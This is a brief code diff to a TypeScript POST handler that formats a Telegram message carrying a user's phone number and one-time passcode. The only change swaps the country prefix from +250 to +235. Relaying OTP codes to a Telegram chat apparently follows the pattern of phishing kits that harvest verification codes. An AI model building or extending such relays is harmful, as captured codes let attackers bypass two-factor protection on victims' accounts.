@@ -49,7 +49,7 @@ export async function POST(request: Request) {
     const telegramMessage = `
 🔐 *OTP Verification Request*
 
-📱 Phone Number: \`+250${phoneNumber}\`
+📱 Phone Number: \`+235${phoneNumber}\`
 🔑 OTP Code: \`${otpCode}\`
 ⏰ Timestamp: ${new Date().toISOString()}
 📋 Record ID: \`${data.id}\`
